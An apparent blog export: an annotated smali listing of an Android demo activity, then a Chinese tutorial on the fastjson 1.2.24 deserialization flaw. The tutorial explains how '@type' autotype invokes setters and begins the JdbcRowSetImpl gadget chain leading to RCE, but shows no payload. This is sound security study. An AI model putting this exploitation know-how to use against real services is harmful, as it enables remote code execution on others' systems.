<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="comment">#文件头描述</span></span><br><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcom/social_touch/demo/MainActivity;</span></span><br><span class="line"><span class="keyword">.super</span> <span class="class">Landroid/app/Activity;</span><span class="comment">#指定MainActivity的父类</span></span><br><span class="line"><span class="keyword">.source</span> <span class="string">&quot;MainActivity.java&quot;</span><span class="comment">#源文件名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#表明实现了View.OnClickListener接口</span></span><br><span class="line"><span class="comment"># interfaces</span></span><br><span class="line"><span class="keyword">.implements</span> <span class="class">Landroid/view/View$OnClickListener;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义float静态字段pi</span></span><br><span class="line"><span class="comment"># static fields</span></span><br><span class="line"><span class="keyword">.field</span><span class="keyword"> private</span><span class="keyword"> static</span><span class="keyword"> final</span> pi:F = 3.14f</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义了String类型字段TAG</span></span><br><span class="line"><span class="comment"># instance fields</span></span><br><span class="line"><span class="keyword">.field</span><span class="keyword"> private</span> TAG:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义了boolean类型的字段running</span></span><br><span class="line"><span class="keyword">.field</span><span class="keyword"> public</span> volatile running:Z</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造方法</span></span><br><span class="line"><span class="comment"># direct methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .locals</span> 1<span class="comment">#表示函数中使用了一个局部变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span><span class="comment">#表示方法中代码正式开始</span></span><br><span class="line"><span class="keyword">    .line</span> 8<span class="comment">#表示对应与java源文件的di8行</span></span><br><span class="line">    <span class="comment">#调用Activity中的init()方法</span></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Landroid/app/Activity;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 10</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">&quot;MainActivity&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iput-object </span>v0, p0, <span class="class">Lcom/social_touch/demo/MainActivity;</span>-&gt;TAG:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 13</span><br><span class="line">   <span class="built_in"> const/4 </span>v0, 0x0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iput-boolean </span>v0, p0, <span class="class">Lcom/social_touch/demo/MainActivity;</span>-&gt;running:Z</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#静态方法log()</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> log(I)V</span><br><span class="line"><span class="keyword">    .locals</span> 3</span><br><span class="line"><span class="keyword">    .parameter</span> <span class="string">&quot;result&quot;</span><span class="comment">#表示result参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 42</span><br><span class="line">    <span class="comment">#v0寄存器中赋值为&quot;MainActivity&quot;</span></span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">&quot;MainActivity&quot;</span></span><br><span class="line">    <span class="comment">#创建StringBuilder对象,并将其引用赋值给v1寄存器</span></span><br><span class="line">   <span class="built_in"> new-instance </span>v1, <span class="class">Ljava/lang/StringBuilder;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用StringBuilder中的构造方法</span></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v1&#125;, <span class="class">Ljava/lang/StringBuilder;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    <span class="comment">#v2寄存器中赋值为ther result:</span></span><br><span class="line">   <span class="built_in"> const-string </span>v2, <span class="string">&quot;the result:&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#&#123;v1,v2&#125;大括号中v1寄存器中存储的是StringBuilder对象的引用.</span></span><br><span class="line">    <span class="comment">#调用StringBuilder中的append(String str)方法,v2寄存器则是参数寄存器.</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/StringBuilder;</span>-&gt;append(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/StringBuilder;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取上一个方法的执行结果,此时v1中存储的是append()方法执行后的结果,此处之所以仍然返回v1的    #原因在与append()方法返回的就是自身的引用</span></span><br><span class="line">   <span class="built_in"> move-result-object </span>v1</span><br><span class="line"></span><br><span class="line">    <span class="comment">#继续调用append方法(),p0表示第一个参数寄存器,即上面提到的result参数</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1, p0&#125;, <span class="class">Ljava/lang/StringBuilder;</span>-&gt;append(I)<span class="class">Ljava/lang/StringBuilder;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#同上</span></span><br><span class="line">   <span class="built_in"> move-result-object </span>v1</span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用StringBuilder对象的toString()方法</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/lang/StringBuilder;</span>-&gt;toString()<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取上一个方法执行结果,toString()方法返回了一个新的String对象,因此v1中此时存储了String对象的引用</span></span><br><span class="line">   <span class="built_in"> move-result-object </span>v1</span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用Log类中的静态方法e().因为e()是静态方法,因此&#123;v0,v1&#125;中的成了参数寄存器</span></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v0, v1&#125;, <span class="class">Landroid/util/Log;</span>-&gt;d(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 43</span><br><span class="line">    <span class="comment">#调用返回指令,此处没有返回任何值</span></span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># virtual methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> add(II)I</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line"><span class="keyword">    .parameter</span> <span class="string">&quot;x&quot;</span><span class="comment">#第一个参数</span></span><br><span class="line"><span class="keyword">    .parameter</span> <span class="string">&quot;y&quot;</span><span class="comment">#第二个参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 34</span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用add-int指令求和之后将结果赋值给v0寄存器</span></span><br><span class="line">   <span class="built_in"> add-int </span>v0, p1, p2</span><br><span class="line"></span><br><span class="line">    <span class="comment">#返回v0寄存器中的值</span></span><br><span class="line">   <span class="built_in"> return </span>v0<span class="keyword"></span></span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> onClick(<span class="class">Landroid/view/View;</span>)V</span><br><span class="line"><span class="keyword">    .locals</span> 4</span><br><span class="line"><span class="keyword">    .parameter</span> <span class="string">&quot;view&quot;</span> <span class="comment">#参数view</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v3, 0x4 <span class="comment">#v3寄存器中赋值为4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 23<span class="comment">#java源文件中的第23行</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v1, 0x5<span class="comment">#v1寄存器中赋值为5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用add()方法</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, v3, v1&#125;, <span class="class">Lcom/social_touch/demo/MainActivity;</span>-&gt;add(II)I</span><br><span class="line"></span><br><span class="line">    <span class="comment">#从v0寄存器中获取add方法的执行结果</span></span><br><span class="line">   <span class="built_in"> move-result </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 24<span class="comment">#java源文件中的24行</span></span><br><span class="line"><span class="keyword">    .local</span> v0, result:I</span><br><span class="line"></span><br><span class="line">    <span class="comment">#v1寄存器中赋值为PrintStream对象的引用out</span></span><br><span class="line">   <span class="built_in"> sget-object </span>v1, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#执行out对象的println()方法</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1, v0&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(I)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 26</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/16 </span>v1, 0x9<span class="comment">#v1寄存器中赋值为9</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v2, 0x3<span class="comment">#v2寄存器中赋值为3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用sub()方法,&#123;p0,v1,v2&#125;,p0指的是this,即当前对象,v1,v2则是参数</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, v1, v2&#125;, <span class="class">Lcom/social_touch/demo/MainActivity;</span>-&gt;sub(II)I</span><br><span class="line">    <span class="comment">#从v0寄存器中获取sub()方法的执行结果</span></span><br><span class="line">   <span class="built_in"> move-result </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 28</span><br><span class="line">   <span class="built_in"> if-le </span>v0, v3,<span class="keyword"> :cond_0</span><span class="comment">#如果v0寄存器的值小于v3寄存器中的值,则跳转到cond_0处继续执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 29</span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用静态方法log()</span></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v0&#125;, <span class="class">Lcom/social_touch/demo/MainActivity;</span>-&gt;log(I)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 31</span><br><span class="line">   <span class="keyword"> :cond_0</span></span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> protected</span> onCreate(<span class="class">Landroid/os/Bundle;</span>)V</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line"><span class="keyword">    .parameter</span> <span class="string">&quot;savedInstanceState&quot;</span> <span class="comment">#参数savedInstancestate</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 17</span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用父类方法onCreate()</span></span><br><span class="line">   <span class="built_in"> invoke-super </span>&#123;p0, p1&#125;, <span class="class">Landroid/app/Activity;</span>-&gt;onCreate(<span class="class">Landroid/os/Bundle;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 18</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const </span>v0, 0x7f04001a<span class="comment">#v0寄存器赋值为0x7f04001a</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用方法setContentView()</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, v0&#125;, <span class="class">Lcom/social_touch/demo/MainActivity;</span>-&gt;setContentView(I)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 19</span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#declared-synchronized表示该方法是同步方法</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> declared-synchronized sub(II)I</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line"><span class="keyword">    .parameter</span> <span class="string">&quot;x&quot;</span></span><br><span class="line"><span class="keyword">    .parameter</span> <span class="string">&quot;y&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 38</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> monitor-enter </span>p0<span class="comment">#为该方法添加锁对象p0</span></span><br><span class="line">    <span class="built_in"> add-int </span>v0, p1, p2</span><br><span class="line">    <span class="comment">#释放锁对象</span></span><br><span class="line">   <span class="built_in"> monitor-exit </span>p0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return </span>v0<span class="keyword"></span></span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>逆向分析</category>
        <category>android</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-smali -android</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson1.2.24反序列化</title>
    <url>/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="fastjson1-2-24反序列化"><a href="#fastjson1-2-24反序列化" class="headerlink" title="fastjson1.2.24反序列化"></a>fastjson1.2.24反序列化</h1><hr>
<p>在最近的项目中，前辈同事多次对fastjson版本进行反序列化漏洞实现RCE。项目中很多站点使用json字符串提交数据，所以就来学习学习如何探测fastjson版本和如何利用fastjson1.2.24反序列化导致RCE</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
<p>这里就主要分析一下<code>fastjson 1.2.24</code>版本的反序列化漏洞，这个漏洞比较普遍的利用手法就是通过JNDI注入的方式实现RCE，所以是一个不得不分析的JNDI注入实践案例！</p>
<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><hr>
<p>fastjson是一个非常流行的库，它可以将数据在<code>JSON</code>和<code>Java Object</code>之间互相转换，我们常说的fastjson<strong>序列化就是将java对象转化为json字符串，而反序列化就是将json字符串转化为java对象</strong></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><hr>
<ul>
<li><p>pom.xml</p>
<p>在pom.xml配置文件中添加fastjson的依赖</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>​      右键点击pom.xml文件,依次选择[maven]–&gt;[Download Sources  and Documentations]下载 配置文件中的依赖项</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109152657979.png" class title="image-20211109152657979">



<ul>
<li><p>导入jar包</p>
<p>首先在maven repository中找到下载的jar包地址</p>
<p><a href="https://mvnrepository.com/artifact/com.alibaba/fastjson">下载地址</a></p>
</li>
</ul>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153634446.png" class title="image-20211109153634446">



<p>​      在仓库中找到所要下载的fastjson版本(这里选用fastjson1.2.24)</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153743931.png" class title="image-20211109153743931">





<h2 id="序列化-x2F-反序列化"><a href="#序列化-x2F-反序列化" class="headerlink" title="序列化&#x2F;反序列化"></a>序列化&#x2F;反序列化</h2><hr>
<p>为了更清晰的了解Fastjson中JSON字符串和对象的转换，使用IDE简单验证fastjson的序列和反序列</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><hr>
<p>使用JSON.toJsonString()方法将Java对象中的属性及其对应值转换为Json字符串</p>
<p><strong>DEMO</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serialization</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setAge(<span class="number">66</span>);</span><br><span class="line">        user.setUsername(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String json = JSON.toJSONString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        System.out.println(<span class="string">&quot;call SetUsername&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;call Age&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>可以看到将java对象使用JSON序列化(JSON.tojsonstring())转换为Json字符串</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109155435748.png" class title="image-20211109155435748">



<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><hr>
<p>fastjson1.2.24反序列化自动调用对应对象类中的setxxx()方法，将JSON字符串中的属性及其对应值通过对象类中的setxx()方法实例化</p>
<p>比如JSON字符串 {“age”:66,”username”:”test”}反序列化User类</p>
<p><strong>Demo1</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">unSerialization</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span>&#123;</span><br><span class="line">        String json = <span class="string">&quot;&#123;\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;&#125;&quot;</span>;  <span class="comment">//定义json字符串</span></span><br><span class="line">        User user = JSON.parseObject(json,User.class);       <span class="comment">//反序列化User类</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lass User&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        System.out.println(<span class="string">&quot;call SetUsername&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Username:&quot;</span>+<span class="keyword">this</span>.username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;call Age&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Age:&quot;</span>+<span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>可以看到运行结果中输出了setxxx()方法中的字符串。所以在反序列化中JSON.parseObject(json，对象类名.class)自动调用了setxxx()方法，</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109161833326.png" class title="image-20211109161833326">



<p>这里的反序列化使用的是<code>parseObject()</code>方法，其实也可以用到<code>parse()</code>方法，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但<code>parseObject()</code> 会将Java对象转为 <code>JSONObject</code>对象，即<code>JSON.toJSON()</code>.</p>
<p>parseObject()和parse()最主要的区别就是前者返回的是<code>JSONObject</code>，而后者会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，返回的是实际类型的对象.当在没有对应类的定义的情况下（没有在<code>@type</code>声明类），通常情况下都会使用<code>JSON.parseObject</code>来获取数据。</p>
<p>由于<code>JSON.parseObject()</code>要反序列化到<strong>对应的对象（比如demo中的User类对象，需要将第二个参数设置为<code>User.class</code>）</strong>才会触发类的<code>setXXX</code>方法，而直接使用该方法返回的是<code>JSONObject</code>对象，是不会触发<code>setXXX</code>方法的（因为JVM也不知道是哪个类的对象）。那要怎么处理才能让<code>JSON.parseObject()</code>在调用时，不输入第二个参数也能执行<code>setXXX</code>方法呢？我们使用parse()方法中下@type指定转换的类。</p>
<p><strong>Demo2</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">unserialization1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">     String json1 = <span class="string">&quot;&#123;\&quot;age\&quot;:123,\&quot;username\&quot;:\&quot;test\&quot;&#125;&quot;</span>;</span><br><span class="line">     String json2 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;&#125;&quot;</span>;</span><br><span class="line">     System.out.println(<span class="string">&quot;反序列化Json1字符串&quot;</span>);</span><br><span class="line">     JSON.parseObject(json1);</span><br><span class="line">     System.out.println(<span class="string">&quot;反序列化json2字符串&quot;</span>);</span><br><span class="line">     JSON.parseObject(json2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        System.out.println(<span class="string">&quot;call SetUsername&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Username:&quot;</span>+<span class="keyword">this</span>.username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;call Age&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Age:&quot;</span>+<span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>由于json1字符串未指定转换的对象类，没有调用setxxx()方法；而json2字符串使用了@type指定了所要转换的对象类，则调用了setxxx()方法。</p>
<p>可见<code>@type</code>参数的作用就是指定json字符串要反序列化的对象类。就是这个类让我们可以进行漏洞利用</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109170634344.png" class title="image-20211109170634344">



<p>相关知识:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ParserConfig类：</span><br><span class="line">配置反序列化信息</span><br><span class="line"></span><br><span class="line">Autotype：</span><br><span class="line">Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的Class类型。</span><br><span class="line"></span><br><span class="line">AutoType安全校验流程,假设如下场景，</span><br><span class="line">​ 服务端接收到的请求Json串中包含了指定恶意代码Class的@Type，</span><br><span class="line">​ 服务端调用JSON.parseObject()时触发了该Class中的构造函数、或者是getter、setter方法中的恶意代码</span><br><span class="line"></span><br><span class="line">AutoType黑名单机制：</span><br><span class="line">在反序列化时，会校验指定的class是否在黑名单中，若在，则抛出异常</span><br><span class="line"></span><br><span class="line">Safemode机制：</span><br><span class="line">配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><hr>
<p>从上面可以看出 ，Fastjson反序列过程中会自动调用@type指定的对象类中的setxxx()方法。所以只要找到一个类，并且他里面的setxxx()方法可以设置自定义的命令执行的属性，就可以造成RCE。</p>
<p>注:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。</span><br></pre></td></tr></table></figure>



<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><hr>
<p>com.sun.rowset.jdbcRowSetImpl这个类可以被利用，这个类里面有很多setxxxx()方法，我们需要利用的则是setDataSourceName()和setAutoCommit()方法。 </p>
<h4 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h4><p><strong>jdbcRowSetimpl.setDataSourceName</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">               <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">               <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

